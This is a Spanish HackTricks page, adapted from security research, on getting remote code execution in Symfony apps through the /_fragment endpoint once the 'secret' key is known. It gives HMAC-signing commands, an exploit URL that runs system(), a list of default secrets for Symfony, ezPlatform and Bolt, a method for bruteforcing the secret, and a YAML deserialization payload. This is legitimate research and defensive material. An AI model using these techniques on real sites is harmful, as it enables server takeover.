## Symfony

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Introducci√≥n <a href="#introduction" id="introduction"></a>

Desde su creaci√≥n en 2008, el uso del framework [Symfony](https://symfony.com) ha ido creciendo cada vez m√°s en aplicaciones basadas en PHP. Ahora es un componente fundamental de muchos CMS conocidos, como [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (anteriormente eZPublish) o [Bolt](https://bolt.cm), y a menudo se utiliza para construir sitios web personalizados.

Una de las caracter√≠sticas integradas de Symfony, dise√±ada para manejar [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes), es la clase [`FragmentListener`](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php). B√°sicamente, cuando alguien emite una solicitud a `/_fragment`, este oyente establece los atributos de la solicitud a partir de los par√°metros GET dados. Dado que esto permite **ejecutar c√≥digo PHP arbitrario** (_m√°s sobre esto m√°s adelante_), la solicitud debe estar firmada utilizando un valor HMAC. La clave criptogr√°fica secreta de este HMAC se almacena en un valor de configuraci√≥n de Symfony llamado `secret`.

Este valor de configuraci√≥n, `secret`, tambi√©n se utiliza, por ejemplo, para construir tokens CSRF y tokens de recordatorio de sesi√≥n. Dado su importancia, este valor debe ser obviamente muy aleatorio.

Desafortunadamente, descubrimos que a menudo, el secreto tiene un **valor predeterminado**, o existen **formas de obtener el valor, fuerza bruta fuera de l√≠nea o simplemente saltarse la comprobaci√≥n de seguridad con la que est√° involucrado**. Esto afecta principalmente a Bolt, eZPlatform y eZPublish.

Aunque esto puede parecer un problema de configuraci√≥n benigno, hemos descubierto que los valores predeterminados, fuerza bruta o adivinables est√°n **muy, muy presentes** en los CMS mencionados, as√≠ como en aplicaciones personalizadas. Esto se debe principalmente a no poner suficiente √©nfasis en su importancia en la documentaci√≥n o gu√≠as de instalaci√≥n.

Adem√°s, un atacante puede escalar vulnerabilidades de menor impacto para leer el `secret` (a trav√©s de una divulgaci√≥n de archivos), saltarse el proceso de firma de `/_fragment` (usando un SSRF) e incluso filtrarlo a trav√©s de `phpinfo()` !

En esta publicaci√≥n de blog, describiremos c√≥mo se puede obtener el secreto en varios CMS y en el marco base, y c√≥mo obtener la ejecuci√≥n de c√≥digo utilizando dicho secreto.

## Un poco de historia <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

Siendo un framework moderno, Symfony ha tenido que lidiar con la generaci√≥n de subpartes de una solicitud desde su creaci√≥n hasta nuestros d√≠as. Antes de `/_fragment`, hab√≠a `/_internal` y `/_proxy`, que hac√≠an esencialmente lo mismo. Esto produjo muchas vulnerabilidades a lo largo de los a√±os: [CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes), [CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy) y [CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access), por ejemplo.

Desde Symfony 4, el secreto se genera durante la instalaci√≥n y la p√°gina `/_fragment` est√° desactivada de forma predeterminada. Uno pensar√≠a, por lo tanto, que la conjunci√≥n de tener un `secret` d√©bil y `/_fragment` habilitado ser√≠a rara. No lo es: muchos frameworks se basan en versiones antiguas de Symfony (incluso 2.x sigue siendo muy presente) e implementan un valor `secret` est√°tico o lo generan de manera deficiente. Adem√°s, muchos se basan en ESI y, como tal, habilitan la p√°gina `/_fragment`. Adem√°s, como veremos, otras vulnerabilidades de menor impacto pueden permitir la volcado del secreto, incluso si se ha generado de manera segura.

## Ejecuci√≥n de c√≥digo con la ayuda de `secret` <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

Primero demostraremos c√≥mo un atacante, teniendo conocimiento del valor de configuraci√≥n `secret`, puede obtener la ejecuci√≥n de c√≥digo. Esto se hace para la √∫ltima versi√≥n de `symfony/http-kernel`, pero es similar para otras versiones.

### Usando `/_fragment` para ejecutar c√≥digo arbitrario <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

Como se mencion√≥ antes, haremos uso de la p√°gina `/_fragment`.
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
    public function onKernelRequest(RequestEvent $event)
    {
        $request = $event->getRequest();

        # [1]
        if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
            return;
        }

        if ($request->attributes->has('_controller')) {
            // Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
            $request->query->remove('_path');

            return;
        }

        # [2]
        if ($event->isMasterRequest()) {
            $this->validateRequest($request);
        }

        # [3]
        parse_str($request->query->get('_path', ''), $attributes);
        $request->attributes->add($attributes);
        $request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
        $request->query->remove('_path');
    }
}
```
`FragmentListener:onKernelRequest` se ejecutar√° en cada solicitud: si la ruta de la solicitud es `/_fragment` \[1], el m√©todo primero verificar√° que la solicitud sea v√°lida (_es decir_, est√© correctamente firmada) y lanzar√° una excepci√≥n en caso contrario \[2]. Si las comprobaciones de seguridad tienen √©xito, analizar√° el par√°metro `_path` codificado en la URL y establecer√° los atributos `$request` en consecuencia.

Los atributos de solicitud no deben confundirse con los par√°metros de solicitud HTTP: son valores internos, mantenidos por Symfony, que generalmente no pueden ser especificados por un usuario. Uno de estos atributos de solicitud es `_controller`, que especifica qu√© controlador de Symfony (una tupla _(clase, m√©todo)_ o simplemente una _funci√≥n_) debe ser llamado. Los atributos cuyo nombre no comienza con `_` son argumentos que se van a pasar al controlador. Por ejemplo, si quisi√©ramos llamar a este m√©todo:
```php
class SomeClass
{
    public function someMethod($firstMethodParam, $secondMethodParam)
    {
        ...
    } 
}
```
Establecimos `_path` a:

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

La solicitud se ver√≠a as√≠:

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

B√°sicamente, esto permite llamar a cualquier funci√≥n o m√©todo de cualquier clase con cualquier par√°metro. Dada la gran cantidad de clases que tiene Symfony, **obtener la ejecuci√≥n de c√≥digo es trivial**. Por ejemplo, podemos llamar a `system()`:

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_Llamar a system no funcionar√° siempre: consulte la secci√≥n de Exploit para obtener m√°s detalles sobre las sutilezas de la explotaci√≥n._

Un problema sigue sin resolverse: ¬øc√≥mo verifica Symfony la firma de la solicitud?

### Firmar la URL <a href="#signing-the-url" id="signing-the-url"></a>

Para verificar la firma de una URL, se calcula un HMAC contra la URL _completa_. El hash obtenido se compara con el especificado por el usuario.

En el c√≥digo, esto se hace en dos lugares:
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
    protected function validateRequest(Request $request)
    {
        // is the Request safe?
        if (!$request->isMethodSafe()) {
            throw new AccessDeniedHttpException();
        }

        // is the Request signed?
        if ($this->signer->checkRequest($request)) {
            return;
        }

        # [3]
        throw new AccessDeniedHttpException();
    }
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
    public function checkRequest(Request $request): bool
    {
        $qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

        // we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
        return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
    }

    /**
     * Checks that a URI contains the correct hash.
     *
     * @return bool True if the URI is signed correctly, false otherwise
     */
    public function check(string $uri)
    {
        $url = parse_url($uri);
        if (isset($url['query'])) {
            parse_str($url['query'], $params);
        } else {
            $params = [];
        }

        if (empty($params[$this->parameter])) {
            return false;
        }

        $hash = $params[$this->parameter];
        unset($params[$this->parameter]);

        # [2]
        return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
    }

    private function computeHash(string $uri): string
    {
        # [1]
        return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
    }

    private function buildUrl(array $url, array $params = []): string
    {
        ksort($params, SORT_STRING);
        $url['query'] = http_build_query($params, '', '&');

        $scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
        $host = isset($url['host']) ? $url['host'] : '';
        $port = isset($url['port']) ? ':'.$url['port'] : '';
        $user = isset($url['user']) ? $url['user'] : '';
        $pass = isset($url['pass']) ? ':'.$url['pass'] : '';
        $pass = ($user || $pass) ? "$pass@" : '';
        $path = isset($url['path']) ? $url['path'] : '';
        $query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
        $fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

        return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
    }
}
```
En resumen, Symfony extrae el par√°metro GET `_hash`, luego reconstruye la URL completa, por ejemplo `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, calcula un HMAC de esta URL utilizando el `secret` como clave \[1], y lo compara con el valor hash dado \[2]. Si no coinciden, se genera una excepci√≥n `AccessDeniedHttpException` \[3], lo que resulta en un error `403`.

### Ejemplo <a href="#example" id="example"></a>

Para probar esto, configuremos un entorno de prueba y extraigamos el secreto (en este caso, generado aleatoriamente).
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
Ahora, al visitar `http://localhost:8000/_fragment` obtenemos un `403`. Ahora intentemos proporcionar una firma v√°lida:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
Al revisar `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`, ahora obtenemos un c√≥digo de estado `404`. La firma era correcta, pero no especificamos ning√∫n atributo de solicitud, por lo que Symfony no encuentra nuestro controlador.

Dado que podemos llamar a cualquier m√©todo, con cualquier argumento, podemos por ejemplo elegir `system($command, $return_value)`, y proporcionar un payload de la siguiente manera:
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
Ahora podemos visitar la URL de explotaci√≥n: `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

A pesar del error `500`, podemos ver que **nuestro comando se ejecut√≥**.

_RCE usando fragmento_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## Encontrando secretos <a href="#finding-secrets" id="finding-secrets"></a>

De nuevo, todo esto no importar√≠a si los secretos no fueran obtenibles. A menudo, lo son. Describiremos varias formas de obtener la ejecuci√≥n de c√≥digo sin ning√∫n conocimiento previo.

### A trav√©s de vulnerabilidades <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

Comencemos con lo obvio: usar vulnerabilidades de menor impacto para obtener el secreto.

#### Lectura de archivos <a href="#file-read" id="file-read"></a>

Evidentemente, una vulnerabilidad de lectura de archivos podr√≠a usarse para leer los siguientes archivos y obtener `secret`:

* `app/config/parameters.yml`
* `.env`

_Como ejemplo, algunas barras de herramientas de depuraci√≥n de Symfony permiten leer archivos._

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

En versiones recientes de Symfony (3.x), `secret` se almacena en `.env` como `APP_SECRET`. Dado que luego se importa como una variable de entorno, se pueden ver a trav√©s de una p√°gina `phpinfo()`.

_Filtrando APP\_SECRET a trav√©s de phpinfo_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

Esto se puede hacer principalmente a trav√©s del paquete de perfilador de Symfony, como se muestra en la captura de pantalla.

#### SSRF / IP spoofing (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

El c√≥digo detr√°s de `FragmentListener` ha evolucionado a lo largo de los a√±os: hasta la versi√≥n _2.5.3_, cuando la solicitud proven√≠a de un proxy de confianza (l√©ase: `localhost`), se considerar√≠a segura y, como tal, no se comprobar√≠a el hash. Un SSRF, por ejemplo, puede permitir ejecutar c√≥digo de inmediato, independientemente de tener `secret` o no. Esto afecta notablemente a eZPublish hasta 2014.7.
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
    protected function validateRequest(Request $request)
    {
        // is the Request safe?
        if (!$request->isMethodSafe()) {
            throw new AccessDeniedHttpException();
        }

        // does the Request come from a trusted IP?
        $trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
        $remoteAddress = $request->server->get('REMOTE_ADDR');
        if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
            return;
        }

        // is the Request signed?
        // we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
        if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
            return;
        }

        throw new AccessDeniedHttpException();
    }

    protected function getLocalIpAddresses()
    {
        return array('127.0.0.1', 'fe80::1', '::1');
    }
```
Es cierto que todas esas t√©cnicas requieren otra vulnerabilidad. Sumerg√°monos en un vector a√∫n mejor: los valores predeterminados.

### A trav√©s de valores predeterminados <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Al configurar un sitio web de Symfony, el primer paso es instalar el esqueleto [symfony-standard](https://github.com/symfony/symfony-standard). Al instalarlo, se solicitan algunos valores de configuraci√≥n. Por defecto, la clave es `ThisTokenIsNotSoSecretChangeIt`.

_Instalaci√≥n de Symfony a trav√©s de composer_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

En versiones posteriores (4+), la clave secreta se genera de forma segura.

#### ezPlatform 3.x (√∫ltimo): `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), el sucesor de [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish), todav√≠a utiliza Symfony. El 10 de junio de 2019, un [commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) estableci√≥ la clave predeterminada en `ff6dc61a329dc96652bb092ec58981f7`. Las versiones vulnerables van desde 3.0-alpha1 hasta 3.1.1 (actual).

Aunque la [documentaci√≥n](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) indica que se debe cambiar la clave secreta, no se impone.

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Al igual que el esqueleto de Symfony, se le pedir√° que ingrese una clave secreta durante la instalaci√≥n. El valor predeterminado es `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`.

#### Bolt CMS <= 3.7 (√∫ltimo): `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm) utiliza [Silex](https://github.com/silexphp/Silex), un micro-framework obsoleto basado en Symfony. Configura la clave secreta utilizando este c√°lculo:
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
Como tal, se puede adivinar el secreto, o utilizar una vulnerabilidad de divulgaci√≥n de ruta completa para calcularlo.

Si no tuvo √©xito con las claves secretas predeterminadas, no se desespere: hay otras formas.

### Fuerza bruta <a href="#bruteforce" id="bruteforce"></a>

Dado que el secreto a menudo se establece manualmente (en lugar de generarse al azar), las personas a menudo usar√°n una frase de contrase√±a en lugar de un valor aleatorio seguro, lo que lo hace susceptible a la fuerza bruta si tenemos un hash para aplicar la fuerza bruta. Obviamente, una URL v√°lida `/_fragment`, como la generada por Symfony, nos proporcionar√≠a una tupla de mensaje-hash v√°lida para aplicar la fuerza bruta al secreto.

_Se incluye una solicitud v√°lida al fragmento en la respuesta_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

Al comienzo de esta publicaci√≥n de blog, dijimos que el secreto de Symfony ten√≠a varios usos. Uno de esos usos es que tambi√©n se utiliza para generar tokens CSRF. Otro uso de `secret` es firmar cookies de recordatorio. En algunos casos, un atacante puede usar su propio token CSRF o cookie de recordatorio para aplicar la fuerza bruta al valor de `secret`.

_La ingenier√≠a inversa de la construcci√≥n de esos tokens se deja como ejercicio para el lector._

### Yendo m√°s all√°: eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

Como ejemplo de c√≥mo se pueden aplicar la fuerza bruta a los secretos para lograr la ejecuci√≥n de c√≥digo, veremos c√≥mo podemos descubrir el secreto de eZPublish 2014.07.

#### Encontrar material para la fuerza bruta <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublish genera sus tokens CSRF de esta manera:
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
Para construir este token, eZP utiliza dos valores que conocemos y el secreto: `getIntention()` es la acci√≥n que el usuario est√° intentando (`autenticar`, por ejemplo), `session_id()` es el ID de sesi√≥n de PHP y `getSecret()`, bueno, es el `secreto` de Symfony.

Dado que los tokens CSRF se pueden encontrar en algunos formularios, ahora tenemos el material para hacer fuerza bruta en el secreto.

Desafortunadamente, ezPublish incorpor√≥ un paquete de sensiolabs, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle). Este paquete se asegura de que la clave secreta sea aleatoria. La genera as√≠, al momento de la instalaci√≥n:
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
    return hash('sha1', uniqid(mt_rand()));
}
```
Esto parece ser muy dif√≠cil de atacar por fuerza bruta: `mt_rand()` puede generar 231 valores diferentes, y `uniqid()` se construye a partir de la marca de tiempo actual (con microsegundos).
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### Revelando la marca de tiempo <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

Afortunadamente, sabemos que este secreto se genera en el √∫ltimo paso de la instalaci√≥n, justo despu√©s de que se configure el sitio web. Esto significa que probablemente podamos filtrar la marca de tiempo utilizada para generar este hash.

Una forma de hacerlo es utilizando los registros (_por ejemplo_ `/var/log/storage.log`); se puede filtrar la primera vez que se cre√≥ una entrada en la cach√©. La entrada de cach√© se crea justo despu√©s de que se llama a `generateRandomSecret()`.

_Contenido de registro de muestra: la marca de tiempo es similar a la utilizada para calcular el secreto_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

Si los registros no est√°n disponibles, se puede utilizar el potente motor de b√∫squeda de eZPublish para encontrar la hora de creaci√≥n del primer elemento del sitio web. De hecho, cuando se crea el sitio, se colocan muchas marcas de tiempo en la base de datos. Esto significa que la marca de tiempo de los datos iniciales del sitio eZPublish es la misma que la utilizada para calcular `uniqid()`. Podemos buscar el _ContentObject_ `landing_page` y averiguar su marca de tiempo.

## Descifrando los fragmentos faltantes <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

Ahora conocemos la marca de tiempo utilizada para calcular el secreto, as√≠ como un hash de la siguiente forma:
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
Esto nos deja con un total de 231 \* 106 posibilidades. Parece factible con [hashcat](https://hashcat.net) y un buen conjunto de GPUs, pero hashcat no proporciona un kernel `sha1(sha1($pass).$salt)`. ¬°Afortunadamente, lo implementamos! Puedes encontrar [la solicitud de extracci√≥n aqu√≠](https://github.com/hashcat/hashcat/pull/2536).

Usando nuestra m√°quina de cracking, que cuenta con 8 GPUs, podemos crackear este hash en _menos de 20 horas_.

Despu√©s de obtener el hash, podemos usar `/_fragment` para ejecutar c√≥digo.

## Conclusi√≥n <a href="#conclusion" id="conclusion"></a>

Symfony es ahora un componente central de muchas aplicaciones PHP. Como tal, cualquier riesgo de seguridad que afecte al framework afecta a muchos sitios web. Como se demostr√≥ en este art√≠culo, ya sea una clave d√©bil o una vulnerabilidad de menor impacto, permite a los atacantes obtener **ejecuci√≥n remota de c√≥digo**.

Como equipo azul, debes revisar todos tus sitios web dependientes de Symfony. El software actualizado no puede descartarse para vulnerabilidades, ya que la clave secreta se genera en la primera instalaci√≥n del producto. Por lo tanto, si creaste un sitio web basado en Symfony 3.x hace unos a√±os y lo mantuviste actualizado en el camino, es probable que la clave secreta siga siendo la predeterminada.

## Explotaci√≥n <a href="#exploitation" id="exploitation"></a>

### Teor√≠a <a href="#theory" id="theory"></a>

Por un lado, tenemos algunas cosas de las que preocuparnos al explotar esta vulnerabilidad:

* El HMAC se calcula utilizando la **URL completa**. Si el sitio web est√° detr√°s de un proxy inverso, necesitamos usar la URL interna del servicio en lugar de la que estamos enviando nuestra carga √∫til. Por ejemplo, la URL interna podr√≠a ser a trav√©s de HTTP en lugar de HTTPS.
* El algoritmo HMAC ha cambiado a lo largo de los a√±os: antes era **SHA-1** y ahora es **SHA-256**.
* Dado que Symfony elimina el par√°metro `_hash` de la solicitud y luego genera la URL nuevamente, debemos calcular el hash en la misma URL que lo hace.
* Se pueden usar muchas claves secretas, por lo que debemos verificarlas todas.
* En algunas versiones de PHP, no podemos llamar a funciones que tienen par√°metros "por referencia", como `system($command, &$return_value)`.
* En algunas versiones de Symfony, `_controller` no puede ser una funci√≥n, tiene que ser un m√©todo. Necesitamos encontrar un m√©todo de Symfony que nos permita ejecutar c√≥digo.

Por otro lado, podemos aprovechar algunas cosas:

* Al golpear `/_fragment` sin par√°metros o con un hash no v√°lido, deber√≠a devolver un `403`.
* Al golpear `/_fragment` con un hash v√°lido pero sin un controlador v√°lido, deber√≠a dar un `500`.

El √∫ltimo punto nos permite probar valores secretos sin preocuparnos por qu√© funci√≥n o m√©todo vamos a llamar despu√©s.

### Pr√°ctica <a href="#practice" id="practice"></a>

Digamos que estamos atacando `https://target.com/_fragment`. Para poder firmar correctamente una URL, necesitamos conocer:

* URL interna: podr√≠a ser `https://target.com/_fragment`, o tal vez `http://target.com/_fragment`, o algo completamente diferente (_por ejemplo_, `http://target.website.internal`), que no podemos adivinar.
* Clave secreta: tenemos una lista de claves secretas habituales, como `ThisTokenIsNotSoSecretChangeIt`, `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`, etc.
* Algoritmo: SHA1 o SHA256

No necesitamos preocuparnos por la carga √∫til efectiva (el contenido de `_path`) todav√≠a, porque una URL correctamente firmada no dar√° lugar a que se lance una `AccessDeniedHttpException` y, como tal, no dar√° lugar a un `403`. Por lo tanto, el exploit probar√° cada combinaci√≥n `(algoritmo, URL, secreto)`, generar√° una URL y comprobar√° si no devuelve un c√≥digo de estado `403`.

_Una solicitud v√°lida a `/_fragment`, sin el par√°metro `_path`_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

En este punto, podemos firmar cualquier URL `/_fragment`, lo que significa que es una RCE garantizada. Es solo una cuesti√≥n de qu√© llamar.

Luego, necesitamos averiguar si podemos llamar a una funci√≥n directamente o si necesitamos usar un m√©todo de clase. Primero podemos intentar la forma m√°s directa, utilizando una funci√≥n como `phpinfo ([ int $what = INFO_ALL ] )` ([documentaci√≥n](https://www.php.net/manual/en/function.phpinfo.php)). El par√°metro GET `_path` se ver√≠a as√≠:
```
_controller=phpinfo
&what=-1
```
Y la URL se ver√≠a as√≠:

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

Si la respuesta HTTP muestra una p√°gina `phpinfo()`, hemos ganado. Entonces podemos intentar usar otra funci√≥n, como `assert`:

_Ejemplo de salida usando `_controller=assert`_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

De lo contrario, esto significa que necesitaremos usar un m√©todo de clase en su lugar. Un buen candidato para esto es `Symfony\Component\Yaml\Inline::parse`, que es una clase integrada de Symfony, y como tal est√° presente en sitios web de Symfony.

Obviamente, este m√©todo analiza una cadena de entrada YAML. El analizador YAML de Symfony admite la etiqueta `php/object`, que convertir√° una cadena de entrada serializada en un objeto usando `unserialize()`. ¬°Esto nos permite usar nuestra herramienta PHP favorita, [PHPGGC](https://github.com/ambionics/phpggc)!

El prototipo del m√©todo ha cambiado a lo largo de los a√±os. Por ejemplo, aqu√≠ hay tres prototipos diferentes:
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
En lugar de construir `_path` para cada uno de estos, podemos aprovechar el hecho de que si damos un argumento cuyo nombre no coincide con el prototipo del m√©todo, ser√° ignorado. Por lo tanto, podemos agregar todos los argumentos posibles al m√©todo, sin preocuparnos por el prototipo real.

Por lo tanto, podemos construir `_path` de la siguiente manera:
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
Una vez m√°s, podemos intentar con `phpinfo()` y ver si funciona. Si lo hace, podemos usar `system()` en su lugar.

_Ejemplo de salida usando `Inline::parse` con una carga √∫til serializada_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

Por lo tanto, el exploit recorrer√° todas las posibles combinaciones de variables y luego probar√° los dos m√©todos de explotaci√≥n. El c√≥digo est√° disponible en [nuestro GitHub](https://github.com/ambionics/symfony-exploits).

## Accediendo a la informaci√≥n de symfony /\_profiler

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

Como se puede ver en la captura de pantalla anterior, hay un logotipo de `sf` en la esquina inferior derecha de la p√°gina. Este logotipo se muestra cuando Symfony est√° en modo de depuraci√≥n. Hay algunos casos en los que este logotipo no aparece, as√≠ que intente acceder a `/_profiler` y ver√° la p√°gina como se muestra a continuaci√≥n.

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

Esta funci√≥n se llama Symfony Profiler, y no hay mucha informaci√≥n sobre esta funci√≥n en Internet. La intenci√≥n de esta funci√≥n es muy clara; ayuda a depurar cuando hay un error o un fallo. Por supuesto, esta funci√≥n solo se puede utilizar cuando se habilita el modo de depuraci√≥n.

